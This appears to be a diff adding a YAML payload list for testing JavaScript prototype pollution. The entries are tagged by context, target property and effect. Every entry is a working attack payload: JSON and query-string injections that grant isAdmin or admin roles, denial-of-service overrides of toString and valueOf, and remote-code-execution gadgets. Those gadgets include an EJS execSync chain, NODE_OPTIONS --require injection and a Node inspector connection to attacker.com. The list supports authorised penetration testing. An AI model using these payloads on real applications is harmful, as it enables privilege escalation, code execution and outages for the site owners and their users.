@@ -1,0 +1,139 @@
+# Prototype Pollution Payloads with Metadata
+# Usage: Filter by type and context for targeted testing
+
+payloads:
+  # Property injection via __proto__
+  - payload: '{"__proto__": {"isAdmin": true}}'
+    type: property-injection
+    context: [JSON-body, merge-operation]
+    target_property: isAdmin
+    bypass_type: proto-key
+    detection: privilege-escalation
+
+  - payload: '{"__proto__": {"role": "admin"}}'
+    type: property-injection
+    context: [JSON-body, merge-operation]
+    target_property: role
+    bypass_type: proto-key
+    detection: privilege-escalation
+
+  - payload: '{"__proto__": {"admin": true}}'
+    type: property-injection
+    context: [JSON-body, merge-operation]
+    target_property: admin
+    bypass_type: proto-key
+    detection: privilege-escalation
+
+  - payload: '{"__proto__": {"status": 1}}'
+    type: property-injection
+    context: [JSON-body, merge-operation]
+    target_property: status
+    bypass_type: proto-key
+    detection: state-manipulation
+
+  # Constructor.prototype injection
+  - payload: '{"constructor": {"prototype": {"isAdmin": true}}}'
+    type: property-injection
+    context: [JSON-body, nested-object]
+    target_property: isAdmin
+    bypass_type: constructor-prototype
+    detection: privilege-escalation
+
+  - payload: '{"constructor": {"prototype": {"role": "admin"}}}'
+    type: property-injection
+    context: [JSON-body, nested-object]
+    target_property: role
+    bypass_type: constructor-prototype
+    detection: privilege-escalation
+
+  - payload: '{"constructor": {"prototype": {"canDelete": true}}}'
+    type: property-injection
+    context: [JSON-body, nested-object]
+    target_property: canDelete
+    bypass_type: constructor-prototype
+    detection: privilege-escalation
+
+  # Query parameter pollution
+  - payload: "__proto__[isAdmin]=true"
+    type: property-injection
+    context: [query-parameter]
+    target_property: isAdmin
+    bypass_type: bracket-notation
+    detection: privilege-escalation
+
+  - payload: "__proto__.role=admin"
+    type: property-injection
+    context: [query-parameter]
+    target_property: role
+    bypass_type: dot-notation
+    detection: privilege-escalation
+
+  - payload: "constructor[prototype][isAdmin]=true"
+    type: property-injection
+    context: [query-parameter]
+    target_property: isAdmin
+    bypass_type: constructor-bracket
+    detection: privilege-escalation
+
+  # RCE via gadget chains
+  - payload: '{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}'
+    type: RCE-via-gadget
+    context: [JSON-body, merge-operation]
+    target_property: NODE_OPTIONS
+    bypass_type: child-process-gadget
+    detection: command-execution
+    warning: "Can achieve RCE via child_process spawn — test only in isolated environments"
+
+  - payload: '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=attacker.com:9229"}}'
+    type: RCE-via-gadget
+    context: [JSON-body, merge-operation]
+    target_property: NODE_OPTIONS
+    bypass_type: node-inspector-gadget
+    detection: reverse-connection
+    warning: "Opens Node.js debugger on attacker-controlled host"
+
+  - payload: '{"__proto__": {"env": {"NODE_OPTIONS": "--require /app/malicious.js"}}}'
+    type: RCE-via-gadget
+    context: [JSON-body, nested-object]
+    target_property: env
+    bypass_type: env-gadget
+    detection: command-execution
+    warning: "Injects environment variables into child processes"
+
+  - payload: '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(''child_process'').execSync(''id'');//"}}'
+    type: RCE-via-gadget
+    context: [JSON-body, merge-operation]
+    target_property: outputFunctionName
+    bypass_type: ejs-gadget
+    detection: command-execution
+    warning: "EJS template engine RCE gadget — test only in isolated environments"
+
+  # DoS via prototype pollution
+  - payload: '{"__proto__": {"toString": "polluted"}}'
+    type: DoS
+    context: [JSON-body, merge-operation]
+    target_property: toString
+    bypass_type: builtin-override
+    detection: application-crash
+
+  - payload: '{"__proto__": {"valueOf": "polluted"}}'
+    type: DoS
+    context: [JSON-body, merge-operation]
+    target_property: valueOf
+    bypass_type: builtin-override
+    detection: application-crash
+
+  - payload: '{"__proto__": {"length": 99999999}}'
+    type: DoS
+    context: [JSON-body, merge-operation]
+    target_property: length
+    bypass_type: builtin-override
+    detection: resource-exhaustion
+
+  # Object.assign abuse
+  - payload: 'Object.assign({}, JSON.parse(''{"__proto__": {"polluted": true}}''))'
+    type: gadget-chain
+    context: [merge-operation, nested-object]
+    target_property: polluted
+    bypass_type: object-assign
+    detection: prototype-check
